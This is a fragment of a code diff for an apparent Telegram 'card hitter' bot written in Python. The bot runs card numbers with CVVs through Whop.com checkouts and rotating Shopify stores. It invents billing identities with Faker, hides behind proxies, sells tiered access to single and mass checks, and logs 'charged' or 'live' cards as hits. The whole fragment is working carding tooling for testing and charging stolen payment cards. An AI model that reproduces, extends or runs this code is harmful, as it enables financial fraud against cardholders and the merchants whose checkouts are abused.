+            print(f"📥 [Whop] PATCH Response: {patch_response.status_code}")
+            
+            if patch_response.status_code == 200:
+                result = patch_response.json()
+                
+                # ============ STEP 5: Parse PATCH response ============
+                status, error_msg, status_display = parse_whop_errors(result)
+                
+                if status:
+                    print(f"📥 [Whop] Error from PATCH: {error_msg}")
+                    return {
+                        'status': status,
+                        'result': status_display,
+                        'message': error_msg,
+                        'status_display': status_display,
+                        'status_category': status,
+                        'data': result
+                    }
+                
+                # Check if completed
+                if result.get('completed') or result.get('status') == 'completed':
+                    print(f"✅ [Whop] Checkout completed successfully!")
+                    return {
+                        'status': 'charged',
+                        'result': 'CHARGED',
+                        'message': 'Checkout completed successfully!',
+                        'status_display': '🔥 CHARGED 🔥',
+                        'status_category': 'charged',
+                        'data': result
+                    }
+                
+                # Check tasks for status
+                tasks = result.get('tasks', [])
+                for task in tasks:
+                    if task.get('status') == 'failed':
+                        task_message = task.get('message', 'Unknown error')
+                        print(f"❌ [Whop] Task failed: {task_message}")
+                        return {
+                            'status': 'declined',
+                            'result': 'DECLINED',
+                            'message': task_message,
+                            'status_display': '❌ DECLINED',
+                            'status_category': 'declined',
+                            'data': result
+                        }
+                
+                return {
+                    'status': 'declined',
+                    'result': 'DECLINED',
+                    'message': 'Card declined',
+                    'status_display': '❌ DECLINED',
+                    'status_category': 'declined',
+                    'data': result
+                }
+            else:
+                # Try to parse error from response
+                try:
+                    error_data = patch_response.json()
+                    status, error_msg, status_display = parse_whop_errors(error_data)
+                    if status:
+                        return {
+                            'status': status,
+                            'result': status_display,
+                            'message': error_msg,
+                            'status_display': status_display,
+                            'status_category': status,
+                            'data': error_data
+                        }
+                except:
+                    pass
+                
+                return {
+                    'status': 'error',
+                    'message': f'HTTP {patch_response.status_code}: {patch_response.text[:200]}',
+                    'status_display': f'⚠️ HTTP {patch_response.status_code}',
+                    'status_category': 'error'
+                }
+                
+    except httpx.TimeoutException:
+        print(f"⏰ [Whop] Timeout")
+        return {
+            'status': 'error',
+            'message': 'Request timeout',
+            'status_display': '⚠️ TIMEOUT',
+            'status_category': 'error'
+        }
+    except Exception as e:
+        print(f"❌ [Whop] Complete error: {e}")
+        import traceback
+        traceback.print_exc()
+        return {
+            'status': 'error',
+            'message': str(e)[:100],
+            'status_display': '⚠️ ERROR',
+            'status_category': 'error'
+        }
+
+# ============ MAIN CHECKOUT FUNCTION ============
+
+async def process_whop_checkout(card: str, checkout_url: str, proxy: str = None) -> Dict:
+    """Process Whop checkout with proper session and secret handling."""
+    print(f"\n{'='*80}")
+    print(f"💳 [WHOP HITTER] Processing card: {card[:20]}...")
+    print(f"📍 URL: {checkout_url[:100]}...")
+    print(f"{'='*80}")
+    
+    start_time = time.time()
+    
+    try:
+        # Extract data from URL
+        url_data = extract_checkout_data_from_url(checkout_url)
+        
+        checkout_id = url_data.get('checkout_id')
+        secret = url_data.get('secret')
+        
+        if not checkout_id:
+            return {
+                'status': 'error',
+                'message': 'Could not extract checkout ID from URL',
+                'status_display': '⚠️ INVALID URL',
+                'status_category': 'error',
+                'elapsed': time.time() - start_time
+            }
+        
+        if not secret:
+            return {
+                'status': 'error',
+                'message': 'Missing secret parameter in URL. Get a fresh checkout URL.',
+                'status_display': '⚠️ MISSING SECRET',
+                'status_category': 'error',
+                'elapsed': time.time() - start_time
+            }
+        
+        print(f"📋 Checkout ID: {checkout_id}")
+        print(f"🔑 Secret: {secret[:30]}...")
+        
+        # Generate user data
+        fake = Faker()
+        first_name = fake.first_name()
+        last_name = fake.last_name()
+        
+        billing = {
+            'name': f"{first_name} {last_name}",
+            'city': fake.city(),
+            'country': 'US',
+            'line1': fake.street_address(),
+            'line2': '',
+            'postalCode': fake.zipcode(),
+            'state': fake.state_abbr(),
+        }
+        
+        print(f"👤 Name: {billing['name']}")
+        print(f"📍 Address: {billing['line1']}, {billing['city']}, {billing['state']} {billing['postalCode']}")
+        
+        # Tokenize card
+        card_token = await tokenize_card_basis_theory(card, proxy)
+        if not card_token:
+            return {
+                'status': 'error',
+                'message': 'Failed to tokenize card',
+                'status_display': '⚠️ TOKENIZATION FAILED',
+                'status_category': 'error',
+                'elapsed': time.time() - start_time
+            }
+        
+        # Complete checkout
+        result = await complete_whop_checkout(checkout_id, card_token, billing, secret, proxy)
+        result['elapsed'] = time.time() - start_time
+        result['price'] = '$29.95'
+        result['gateway'] = 'Whop'
+        
+        return result
+        
+    except Exception as e:
+        print(f"❌ [Whop] Error: {e}")
+        import traceback
+        traceback.print_exc()
+        return {
+            'status': 'error',
+            'message': str(e)[:100],
+            'status_display': '⚠️ ERROR',
+            'status_category': 'error',
+            'elapsed': time.time() - start_time,
+            'price': '$29.95',
+            'gateway': 'Whop'
+        }
+
+# ============ FORMAT RESPONSE ============
+
+def format_whop_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
+    """Format Whop response for display"""
+    bin_info_text, bank, country, currency_code, country_code = bin_info
+    
+    status_display = result.get("status_display", "⚠️ UNKNOWN")
+    status_category = result.get("status_category", "unknown")
+    message = result.get("message", "Unknown")
+    elapsed = result.get("elapsed", 0)
+    gateway = result.get("gateway", "Whop")
+    price = result.get("price", "$29.95")
+    
+    # Parse card for display
+    card_parts = card.split('|')
+    card_num = card_parts[0] if len(card_parts) > 0 else card
+    exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
+    exp_year = card_parts[2] if len(card_parts) > 2 else "XX"
+    exp_year_short = exp_year[-2:] if len(exp_year) == 4 else exp_year
+    cvv = card_parts[3] if len(card_parts) > 3 else "XXX"
+    
+    # Clean message
+    clean_message = message[:100]
+    if len(message) > 100:
+        clean_message += "..."
+    
+    # Format country with flag
+    country_name = country.replace('🌐', '').strip()
+    flag_map = {
+        'USA': '🇺🇸', 'UNITED STATES': '🇺🇸', 'UK': '🇬🇧', 'CANADA': '🇨🇦',
+        'AUSTRALIA': '🇦🇺', 'INDIA': '🇮🇳', 'UAE': '🇦🇪'
+    }
+    country_flag = "🌍"
+    for key, flag in flag_map.items():
+        if key in country_name.upper():
+            country_flag = flag
+            break
+    
+    # Format bank name
+    bank_display = bank if bank != 'N/A' else "Unknown"
+    if len(bank_display) > 25:
+        bank_display = bank_display[:22] + "..."
+    
+    # Determine emoji based on status
+    if "CHARGED" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
+        status_text = "CHARGED"
+    elif "INSUFFICIENT" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")
+        status_text = "INSUFFICIENT FUNDS"
+    elif "CVV LIVE" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        status_text = "CVV LIVE"
+    elif "3D" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["lock"], "🔐")
+        status_text = "3D REQUIRED"
+    elif "APPROVED" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        status_text = "APPROVED"
+    else:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
+        status_text = "DECLINED"
+    
+    # Build output
+    ui = (
+        f"┏━━━━━━━⍟\n"
+        f"┃ {status_emoji} {status_text}\n"
+        f"┗━━━━━━━━━━━⊛\n\n"
+        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card_num}|{exp_month}|{exp_year_short}|{cvv}</code>\n"
+        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ {gateway}\n"
+        f"[⌬] 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ {price}\n"
+        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {clean_message}\n"
+        f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
+        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank_display}\n"
+        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country_name}\n"
+        f"[⌬] 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
+    )
+    
+    return ui, status_category
+
+# ============ COMMAND HANDLERS ============
+
+async def single_check_whop(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Single card check with Whop.com - /hit <card> or /hit <url> <card>"""
+    if not await verify_group_access(update, context):
+        return
+
+    if not context.args:
+        await update.message.reply_text(
+            "💳 <b>Whop.com Hitter</b>\n\n"
+            "Usage: <code>/hit &lt;card&gt;</code>\n"
+            "Or: <code>/hit &lt;checkout_url&gt; &lt;card&gt;</code>\n\n"
+            "Examples:\n"
+            "<code>/hit 4242424242424242|12|2028|123</code>\n"
+            "<code>/hit https://whop.com/checkout/plan_XXX?session=chs_XXX 4242424242424242|12|2028|123</code>\n\n"
+            "⚠️ <b>Important:</b> The URL MUST contain the <code>secret</code> parameter!\n"
+            "💰 Amount: $29.95\n"
+            "📍 Gateway: Whop.com",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    user_id = update.effective_user.id
+    message = update.effective_message
+    username = update.effective_user.username or update.effective_user.first_name
+    
+    args = list(context.args)
+    checkout_url = None
+    card_text = None
+    
+    # Check if first arg is a URL
+    if args and (args[0].startswith('http://') or args[0].startswith('https://')):
+        checkout_url = args[0]
+        card_text = " ".join(args[1:]) if len(args) > 1 else None
+    else:
+        card_text = " ".join(args)
+        checkout_url = context.user_data.get('whop_checkout_url')
+    
+    if not card_text:
+        await message.reply_text("❌ Please provide a card.\n\nUsage: /hit <card> or /hit <url> <card>")
+        return
+    
+    if not checkout_url:
+        await message.reply_text(
+            "❌ No checkout URL set.\n\n"
+            "Set a default URL with:\n"
+            "<code>/setwhop &lt;url&gt;</code>\n\n"
+            "Or provide a URL with the command:\n"
+            "<code>/hit &lt;url&gt; &lt;card&gt;</code>",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    # Check if URL has secret
+    if 'secret=' not in checkout_url:
+        await message.reply_text(
+            "⚠️ <b>Missing Secret Parameter!</b>\n\n"
+            "The checkout URL must contain the <code>secret</code> parameter.\n\n"
+            "Get a fresh URL from the Whop product page.\n\n"
+            "Current URL: <code>{checkout_url[:80]}...</code>",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    card = card_formatter.extract_single_card_from_text(card_text)
+    if not card:
+        await message.reply_text("❌ Invalid card format. Use: NUMBER|MM|YYYY|CVV")
+        return
+
+    # Check credits
+    can_proceed, error_msg = await check_and_deduct_credits(user_id, update, context, is_mass_check=False, card_count=1)
+    if not can_proceed:
+        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+        return
+
+    if not user_manager.can_access_gateway(user_id, 'stripe_charge'):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ <b>Whop hitter not available for {tier.upper()} tier</b>\n\n"
+            f"USE /buy TO UPGRADE YOUR TIER 💎",
+            parse_mode=ParseMode.HTML
+        )
+        add_user_credits(user_id, 1)
+        return
+
+    whop_active_tasks[user_id] = True
+
+    try:
+        tier = user_manager.get_tier(user_id)
+        if user_id not in user_speed_controllers:
+            user_speed_controllers[user_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
+        speed_controller = user_speed_controllers[user_id]
+
+        status_msg = await message.reply_text(
+            f"{premium_emoji(PREMIUM_EMOJI_IDS['time'], '🔄')} Processing Whop checkout (${29.95})...",
+            parse_mode=ParseMode.HTML
+        )
+
+        await speed_controller.wait_if_needed()
+        start = time.time()
+
+        proxy_str = None
+        if user_manager.can_use_proxy(user_id):
+            if user_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[user_id]:
+                proxy_list = autosopi_proxy_tracker.working_proxies[user_id]
+                if proxy_list:
+                    proxy_str = proxy_list[0]
+                    print(f"🔌 [Whop] Using proxy: {mask_proxy(proxy_str)}")
+
+        result = await process_whop_checkout(card, checkout_url, proxy_str)
+        
+        elapsed = time.time() - start
+        speed_controller.record_response(elapsed)
+
+        bin_info = await get_bin_info(card)
+
+        try:
+            await status_msg.delete()
+        except:
+            pass
+
+        ui, status_category = format_whop_response(result, card, bin_info)
+        await message.reply_text(ui, parse_mode=ParseMode.HTML)
+
+        if status_category in ["charged", "approved"]:
+            await save_hit_to_file(
+                card=card, gateway="Whop",
+                response=result.get("message", "Approved"),
+                price="$29.95",
+                bin_info=bin_info, user_id=user_id, user_tier=tier
+            )
+
+            if status_category == "charged":
+                user_data = user_manager.get_user(user_id)
+                await send_hit_notification(
+                    context=context, gateway="Whop", card=card,
+                    response=result.get("message", "Charged"),
+                    price="$29.95",
+                    user=user_data, bin_info=bin_info, status_category="charged"
+                )
+                user_manager.increment_hits(user_id)
+
+        user_manager.increment_checks(user_id)
+
+    except Exception as e:
+        try:
+            await status_msg.delete()
+        except:
+            pass
+        await message.reply_text(f"❌ Error: {str(e)[:100]}")
+        print(f"❌ [Whop] Error: {traceback.format_exc()}")
+        add_user_credits(user_id, 1)
+    finally:
+        whop_active_tasks.pop(user_id, None)
+
+# ============ SETWHOP COMMAND ============
+
+async def setwhop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Set the default Whop checkout URL"""
+    if not await verify_group_access(update, context):
+        return
+
+    if not context.args:
+        current_url = context.user_data.get('whop_checkout_url', 'Not set')
+        await update.message.reply_text(
+            f"🌐 <b>Whop Checkout URL</b>\n\n"
+            f"Current URL: <code>{current_url}</code>\n\n"
+            f"Usage: <code>/setwhop &lt;checkout_url&gt;</code>\n"
+            f"Example: <code>/setwhop https://whop.com/checkout/plan_XXX?secret=xxx</code>\n\n"
+            f"⚠️ <b>IMPORTANT:</b> The URL MUST contain the <code>secret</code> parameter!\n\n"
+            f"💡 To get a fresh URL:\n"
+            f"1. Visit the product page\n"
+            f"2. Click Buy Now\n"
+            f"3. Copy the FULL URL from the address bar\n"
+            f"4. Run this command with the URL",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    checkout_url = context.args[0].strip()
+    
+    if not checkout_url.startswith(('http://', 'https://')):
+        checkout_url = f"https://{checkout_url}"
+    
+    if 'whop.com/checkout/' not in checkout_url:
+        await update.message.reply_text(
+            "❌ Invalid URL. Please provide a valid Whop checkout URL.\n"
+            "Example: https://whop.com/checkout/plan_FPtxpqtykEfI7?secret=xxx",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    # Check if URL has secret
+    if 'secret=' not in checkout_url:
+        await update.message.reply_text(
+            "⚠️ <b>Missing Secret Parameter!</b>\n\n"
+            "The URL must contain the <code>secret</code> parameter.\n\n"
+            "Please get a fresh URL from the Whop product page.\n\n"
+            "Example: <code>https://whop.com/checkout/xxx?secret=eyJhbGciOiJkaXIi...</code>",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    context.user_data['whop_checkout_url'] = checkout_url
+    
+    # Extract and store the checkout ID
+    match = re.search(r'/checkout/([^/?]+)', checkout_url)
+    if match:
+        checkout_id = match.group(1)
+        if not checkout_id.startswith('plan_'):
+            context.user_data['whop_checkout_id'] = checkout_id
+    
+    # Extract and store secret
+    secret_match = re.search(r'[?&]secret=([^&]+)', checkout_url)
+    if secret_match:
+        context.user_data['whop_secret'] = secret_match.group(1)
+    
+    await update.message.reply_text(
+        f"✅ <b>Whop Checkout URL Set!</b>\n\n"
+        f"URL: <code>{checkout_url}</code>\n"
+        f"Checkout ID: <code>{context.user_data.get('whop_checkout_id', 'Unknown')}</code>\n"
+        f"Secret: <code>{context.user_data.get('whop_secret', 'Unknown')[:30]}...</code>\n\n"
+        f"Now you can use <code>/hit</code> to process cards.",
+        parse_mode=ParseMode.HTML,
+        reply_markup=back_menu()
+    )
+
+
+
+# ============ SC GATEWAY (USES SHOPIFY API WITH DEDICATED SITES) ============
+# Add this to your f13.py
+
+# ============ SC SITES STORAGE ============
+SC_SITES_FILE = "sc_sites.json"
+
+class SCSiteManager:
+    """Manage sites specifically for /sc and /msc commands"""
+    
+    def __init__(self, data_file=SC_SITES_FILE):
+        self.data_file = data_file
+        self.sites = []
+        self.site_stats = {}
+        self.site_failures = {}
+        self.current_index = 0
+        self.load_sites()
+        
+    def load_sites(self):
+        """Load sites from file"""
+        if Path(self.data_file).exists():
+            try:
+                with open(self.data_file, 'r') as f:
+                    data = json.load(f)
+                    self.sites = data.get('sites', [])
+                    self.site_stats = data.get('stats', {})
+                    self.site_failures = data.get('failures', {})
+                print(f"📦 Loaded {len(self.sites)} SC sites")
+            except Exception as e:
+                print(f"⚠️ Error loading SC sites: {e}")
+                self._load_default_sites()
+        else:
+            self._load_default_sites()
+    
+    def _load_default_sites(self):
+        """Load default SC sites"""
+        self.sites = [
+            "dswfragrance.myshopify.com",
+        ]
+        self.site_stats = {}
+        self.site_failures = {}
+        self.save_sites()
+        print(f"✅ Loaded {len(self.sites)} default SC sites")
+    
+    def save_sites(self):
+        """Save sites to file"""
+        try:
+            data = {
+                'sites': self.sites,
+                'stats': self.site_stats,
+                'failures': self.site_failures
+            }
+            with open(self.data_file, 'w') as f:
+                json.dump(data, f, indent=2)
+        except Exception as e:
+            print(f"⚠️ Error saving SC sites: {e}")
+    
+    def add_site(self, site: str) -> bool:
+        """Add a site to the rotation"""
+        site = site.strip().lower()
+        site = site.replace('http://', '').replace('https://', '')
+        if site.endswith('/'):
+            site = site[:-1]
+        
+        if site in self.sites:
+            return False
+        
+        self.sites.append(site)
+        self.site_stats[site] = {'successes': 0, 'failures': 0, 'total': 0}
+        self.site_failures[site] = 0
+        self.save_sites()
+        return True
+    
+    def remove_site(self, site: str) -> bool:
+        """Remove a site from rotation"""
+        site = site.strip().lower()
+        site = site.replace('http://', '').replace('https://', '')
+        if site.endswith('/'):
+            site = site[:-1]
+        
+        if site in self.sites:
+            self.sites.remove(site)
+            if site in self.site_stats:
+                del self.site_stats[site]
+            if site in self.site_failures:
+                del self.site_failures[site]
+            self.save_sites()
+            return True
+        return False
+    
+    def get_next_site(self) -> str:
+        """Get next site in rotation"""
+        if not self.sites:
+            return None
+        
+        available = [s for s in self.sites if self.site_failures.get(s, 0) < 3]
+        
+        if not available:
+            self.site_failures = {s: 0 for s in self.sites}
+            self.save_sites()
+            available = self.sites
+        
+        if self.current_index >= len(available):
+            self.current_index = 0
+        
+        site = available[self.current_index]
+        self.current_index += 1
+        return site
+    
+    def mark_result(self, site: str, success: bool):
+        """Mark site result"""
+        if site not in self.site_stats:
+            self.site_stats[site] = {'successes': 0, 'failures': 0, 'total': 0}
+        
+        self.site_stats[site]['total'] += 1
+        if success:
+            self.site_stats[site]['successes'] += 1
+            self.site_failures[site] = max(0, self.site_failures.get(site, 0) - 1)
+        else:
+            self.site_stats[site]['failures'] += 1
+            self.site_failures[site] = self.site_failures.get(site, 0) + 1
+        
+        if self.site_stats[site]['total'] % 10 == 0:
+            self.save_sites()
+    
+    def get_stats(self) -> str:
+        """Get formatted stats"""
+        if not self.sites:
+            return "📋 No SC sites available."
+        
+        msg = f"🌐 <b>SC Sites ({len(self.sites)})</b>\n\n"
+        
+        for i, site in enumerate(self.sites, 1):
+            stats = self.site_stats.get(site, {})
+            total = stats.get('total', 0)
+            successes = stats.get('successes', 0)
+            failures = self.site_failures.get(site, 0)
+            
+            status = "✅" if failures < 3 else "❌"
+            if total > 0:
+                rate = (successes / total) * 100
+                msg += f"{status} {i}. <code>{site}</code> - {rate:.0f}% ({successes}/{total}) failures: {failures}\n"
+            else:
+                msg += f"🔄 {i}. <code>{site}</code> - Untested\n"
+        
+        return msg
+
+
+# Create global instance
+sc_site_manager = SCSiteManager()
+
+
+# ============ /sc SINGLE CHECK ============
+
+@check_gateway("shopify")
+async def sc_single_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Single card check using Shopify API with SC sites - /sc <card>
+    This uses the same Shopify API as /sh but with dedicated sites
+    """
+    if not await verify_group_access(update, context):
+        return
+    
+    if not context.args:
+        await update.message.reply_text(
+            "💳 <b>SC Single Check</b>\n\n"
+            "Usage: <code>/sc &lt;card&gt;</code>\n"
+            "Example: <code>/sc 4111111111111111|12|2025|123</code>\n\n"
+            "📍 Uses Shopify API with SC site rotation\n"
+            "💡 Use /scsite to add custom sites",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    user_id = update.effective_user.id
+    message = update.effective_message
+    username = update.effective_user.username or update.effective_user.first_name
+    card_text = " ".join(context.args).strip()
+    
+    # Extract card
+    card = card_formatter.extract_single_card_from_text(card_text)
+    if not card:
+        await message.reply_text(
+            "❌ Invalid card format. Use: NUMBER|MM|YYYY|CVV\n"
+            "Example: 4111111111111111|12|2025|123"
+        )
+        return
+    
+    # Check credits
+    can_proceed, error_msg = await check_and_deduct_credits(user_id, update, context, is_mass_check=False, card_count=1)
+    if not can_proceed:
+        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+        return
+    
+    # Check gateway access
+    if not user_manager.can_access_gateway(user_id, 'shopify'):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ <b>SC not available for {tier.upper()} tier</b>\n\n"
+            f"USE /buy TO UPGRADE YOUR TIER 💎",
+            parse_mode=ParseMode.HTML
+        )
+        add_user_credits(user_id, 1)
+        return
+    
+    # Get site from SC manager
+    site = sc_site_manager.get_next_site()
+    if not site:
+        await message.reply_text("❌ No SC sites available. Use /scsite to add sites.")
+        return
+    
+    status_msg = await message.reply_text(
+        f"🔄 Checking card with SC...\n📍 Site: <code>{site}</code>",
+        parse_mode=ParseMode.HTML
+    )
+    
+    try:
+        tier = user_manager.get_tier(user_id)
+        
+        # Get proxy if allowed
+        proxy_str = None
+        if user_manager.can_use_proxy(user_id):
+            if user_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[user_id]:
+                proxy_list = autosopi_proxy_tracker.working_proxies[user_id]
+                if proxy_list:
+                    proxy_str = proxy_list[0]
+        
+        # ============ USE SHOPIFY API POOL ============
+        result = await shopify_api_pool.check_card_with_pool(card, site, proxy_str, user_id)
+        
+        elapsed = result.get("elapsed", 0)
+        
+        # Mark site result
+        if result and result.get("status_category") in ["charged", "approved"]:
+            sc_site_manager.mark_result(site, True)
+        else:
+            sc_site_manager.mark_result(site, False)
+        
+        # Get BIN info
+        bin_info = await get_bin_info(card)
+        bin_info_text, bank, country, currency_code, country_code = bin_info
+        
+        # Get response details
+        status_display = result.get("status_display", "❌ DECLINED")
+        status_category = result.get("status_category", "declined")
+        response_msg = result.get("message", "Unknown")
+        price = result.get("price", "0.00")
+        gateway_name = result.get("gateway", "Shopify Payments")
+        api_used = result.get("api_used", "Unknown API")
+        
+        # Format price
+        try:
+            price_float = float(price)
+            price_str = f"${price_float:.2f}"
+        except:
+            price_str = price
+        
+        # Parse card for display
+        card_parts = card.split('|')
+        card_num = card_parts[0] if len(card_parts) > 0 else card
+        exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
+        exp_year = card_parts[2] if len(card_parts) > 2 else "XX"
+        cvv = card_parts[3] if len(card_parts) > 3 else "XXX"
+        
+        # Format country with flag
+        country_name = country.replace('🌐', '').strip()
+        flag_map = {
+            'USA': '🇺🇸', 'UNITED STATES': '🇺🇸', 'UK': '🇬🇧', 'CANADA': '🇨🇦',
+            'AUSTRALIA': '🇦🇺', 'INDIA': '🇮🇳', 'UAE': '🇦🇪'
+        }
+        country_flag = "🌍"
+        for key, flag in flag_map.items():
+            if key in country_name.upper():
+                country_flag = flag
+                break
+        
+        # Format bank name
+        bank_display = bank if bank != 'N/A' else "Unknown"
+        if len(bank_display) > 25:
+            bank_display = bank_display[:22] + "..."
+        
+        # Determine premium emoji based on status
+        if status_category == "charged":
+            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
+            status_display_clean = "CHARGED"
+        elif status_category == "approved":
+            if "INSUFFICIENT" in response_msg.upper():
+                status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")
+                status_display_clean = "INSUFFICIENT FUNDS"
+            else:
+                status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+                status_display_clean = "APPROVED"
+        else:
+            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
+            status_display_clean = "DECLINED"
+        
+        # Build output
+        output = (
+            f"┏━━━━━━━⍟\n"
+            f"┃ {status_emoji} {status_display_clean}\n"
+            f"┗━━━━━━━━━━━⊛\n\n"
+            f"⌬ 𝐂𝐚𝐫𝐝 ↣ <code>{card_num}|{exp_month}|{exp_year}|{cvv}</code>\n"
+            f"⌬ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ {gateway_name}\n"
+            f"⌬ 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ {price_str}\n"
+            f"⌬ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {response_msg[:100]}\n"
+            f"⌬ 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
+            f"⌬ 𝐁𝐚𝐧𝐤 ↣ {bank_display}\n"
+            f"⌬ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country_name}\n"
+            f"⌬ 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
+        )
+        
+        # Delete checking message and send result
+        await status_msg.delete()
+        await message.reply_text(output, parse_mode=ParseMode.HTML)
+        
+        # Save hit if approved/charged
+        if status_category in ["charged", "approved"]:
+            await save_hit_to_file(
+                card=card, gateway=gateway_name,
+                response=response_msg, price=price_str,
+                bin_info=bin_info, user_id=user_id, user_tier=tier
+            )
+            
+            if status_category == "charged":
+                await send_gif_with_result_combined(
+                    update=update, context=context, card=card,
+                    gateway="shopify", response=response_msg,
+                    price=price_str, bin_info=bin_info,
+                    status_category="charged", username=username
+                )
+                
+                user_data = user_manager.get_user(user_id)
+                await send_hit_notification(
+                    context=context, gateway=gateway_name,
+                    card=card, response=response_msg, price=price_str,
+                    user=user_data, bin_info=bin_info, status_category="charged"
+                )
+                
+                user_manager.increment_hits(user_id)
+        
+        user_manager.increment_checks(user_id)
+        
+    except Exception as e:
+        try:
+            await status_msg.delete()
+        except:
+            pass
+        await message.reply_text(f"❌ Error: {str(e)[:100]}")
+        print(f"❌ [SC Single] Error: {traceback.format_exc()}")
+        add_user_credits(user_id, 1)
+
+
+# ============ /msc MASS CHECK ============
+
+@check_gateway("shopify")
+async def sc_mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Mass card check using Shopify API with SC sites - /msc <cards>
+    This uses the same Shopify API as /msh but with dedicated sites
+    """
+    if not await verify_group_access(update, context):
+        return
+    
+    user_id = update.effective_user.id
+    message = update.effective_message
+    
+    # Check if user already has an active session
+    if user_id in shopify_active_tasks:
+        await message.reply_text(
+            "⚠️ You already have an active Shopify session.\n"
+            "Please wait for it to finish or use /stop to cancel.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    if not context.args:
+        await message.reply_text(
+            "📦 <b>SC Mass Check</b>\n\n"
+            "Usage: <code>/msc &lt;card1&gt; &lt;card2&gt; ...</code>\n\n"
+            "Examples:\n"
+            "<code>/msc 4111111111111111|12|2025|123 4222222222222222|11|2026|456</code>\n\n"
+            "📍 Uses Shopify API with SC site rotation\n"
+            "💡 Use /scsite to add custom sites",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    # Check gateway access
+    if not user_manager.can_access_gateway(user_id, 'shopify'):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ <b>SC not available for {tier.upper()} tier</b>\n\n"
+            f"USE /buy TO UPGRADE YOUR TIER 💎",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    # Check if user can mass check
+    if not user_manager.can_mass_check(user_id):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ <b>Mass Check Not Available for {tier.upper()} Tier</b>\n\n"
+            f"Use <code>/sc &lt;card&gt;</code> for single checks.\n\n"
+            f"💎 Upgrade to Premium/Ultimate for mass checks.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    # Extract cards
+    cards_text = " ".join(context.args)
+    card_strings = cards_text.split()
+    
+    cards = []
+    invalid_cards = []
+    for card_str in card_strings:
+        card = card_formatter.extract_single_card_from_text(card_str)
+        if card:
+            cards.append(card)
+        else:
+            invalid_cards.append(card_str[:30])
+    
+    if invalid_cards:
+        await message.reply_text(f"⚠️ Found {len(invalid_cards)} invalid card(s). They will be skipped.")
+    
+    if not cards:
+        await message.reply_text("❌ No valid cards found.")
+        return
+    
+    # Check batch limit
+    max_batch = user_manager.get_max_batch_size(user_id)
+    if len(cards) > max_batch:
+        cards = cards[:max_batch]
+        await message.reply_text(f"⚠️ Truncated to {max_batch} cards.")
+    
+    # Check credits
+    can_proceed, error_msg = await check_and_deduct_mass_credits(user_id, update, context, len(cards))
+    if not can_proceed:
+        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+        return
+    
+    try:
+        await message.delete()
+    except:
+        pass
+    
+    await sc_mass_check_logic(update, context, cards)
+
+
+async def sc_mass_check_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, progress_msg=None):
+    """
+    Mass check logic for SC using Shopify API pool with SC sites
+    """
+    u_id = update.effective_user.id
+    message = update.effective_message
+    total = len(cards)
+    
+    print(f"\n{'='*80}")
+    print(f"🚀 [SC MASS CHECK] Starting batch for user {u_id}")
+    print(f"📊 Total cards: {total}")
+    print(f"{'='*80}")
+    
+    # Get user's working proxies
+    user_proxies = []
+    if user_manager.can_use_proxy(u_id):
+        if u_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[u_id]:
+            user_proxies = autosopi_proxy_tracker.working_proxies[u_id]
+            print(f"🔌 Found {len(user_proxies)} working proxies for rotation")
+    
+    stats = {
+        "charged": 0,
+        "approved": 0,
+        "declined": 0,
